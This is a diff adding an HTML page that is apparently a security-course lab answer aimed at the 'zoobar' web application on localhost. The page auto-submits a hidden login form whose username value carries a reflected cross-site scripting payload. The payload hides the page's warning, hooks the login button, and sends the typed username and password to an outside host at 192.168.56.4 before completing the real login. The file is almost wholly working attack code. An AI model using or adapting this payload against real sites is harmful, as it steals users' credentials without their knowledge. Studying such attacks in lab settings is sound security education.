@@ -1,0 +1,47 @@
+<html>
+<head>
+<title>Page Title</title>
+</head>
+<body>
+
+<form name="loginform" id="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" style="display:none">
+<table>
+<tr>
+   <td>Username:</td>
+  <td><input type="text" name="login_username" size="20"
+  autocomplete="no" value="{{ login_username }}"></td>
+</tr>
+<tr>
+   <td>Password:</td>
+  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
+  <input type="submit" name="submit_login" value="Log in">
+  <input type="submit" name="submit_registration" value="Register"></td>
+</tr>
+</table>
+<input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
+</form>
+<script>
+document.loginform.elements["login_username"].value='"><style>#warning{display:none;}.footer{display:none;}<'+'/style><script>'+
+    'window.onload = function(){'+
+        'document.getElementsByName("submit_login")[0].onclick = function(e){'+
+            'e.preventDefault();'+
+            'var a = document.loginform.elements["login_username"].value;'+
+            'var b = document.loginform.elements["login_password"].value;'+
+            'var image = new Image();'+
+            'image.onerror = function () {'+
+                'var input = document.createElement("input");'+
+                'input.type = "hidden";'+
+                'input.name = "submit_login";'+
+                'input.value = "Log in";'+
+                'document.loginform.appendChild(input);'+            
+                'document.loginform.submit();'+
+            '};'+
+            'image.src="http://192.168.56.4:12345?" + "&payload=" + a +","+ b+"&roll=14013"+ "&random=" + Math.random() + "&timestamp="+ Math.floor(Date.now());'+
+        '};'+
+    '};'+
+'<'+'/script><input  type="hidden';
+document.getElementById('loginform').submit();
+</script>
+</body>
+</html>
+
